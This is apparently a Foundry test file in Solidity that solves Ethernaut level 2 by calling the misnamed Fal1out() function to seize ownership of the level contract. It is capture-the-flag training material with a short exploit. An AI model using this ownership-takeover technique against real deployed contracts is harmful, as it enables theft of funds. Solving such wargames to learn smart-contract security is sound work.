// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "test/Ethernaut.t.sol";

interface Level2 {
    function Fal1out() external payable;
}

contract Level2Test is EthernautTest {
    function testLevel2() public {
        _createLevel("2");
        Level2 levelInstance2 = Level2(levelInstance["2"]);

        // Own contract by calling Fal1out (which is not the constructor)
        levelInstance2.Fal1out();

        require(_submitLevel("2"));
    }

    receive() external payable {
        // Fallback function to receive ether
    }
}
